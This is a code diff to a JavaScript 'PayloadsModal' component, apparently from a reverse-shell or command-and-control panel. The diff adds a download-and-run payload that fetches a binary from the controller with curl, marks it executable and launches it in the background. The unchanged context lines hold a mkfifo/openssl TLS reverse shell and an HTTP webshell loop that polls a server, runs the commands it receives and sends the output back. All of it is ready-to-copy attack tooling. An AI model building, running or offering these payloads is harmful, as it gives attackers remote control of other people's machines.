@@ -831,6 +831,9 @@ const PayloadsModal = () =>
       const tlsPayload = `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
       const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
       const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
+      const muxDownloadPayload = `curl -sL '${httpProto}://${host}/dl?token=${token}&os=linux&arch=amd64' -o /tmp/rsl
+chmod +x /tmp/rsl
+/tmp/rsl &`;
       const copy = (text) =>
         navigator.clipboard.writeText(text).catch(() => {});
       const block = (title, text) =>
@@ -853,6 +856,7 @@ const PayloadsModal = () =>
           block("TLS", tlsPayload),
           block("HTTP webshell", webPayload),
           block("Mux / Go client", muxPayload),
+          block("Mux / download & run", muxDownloadPayload),
         ],
       });
     }
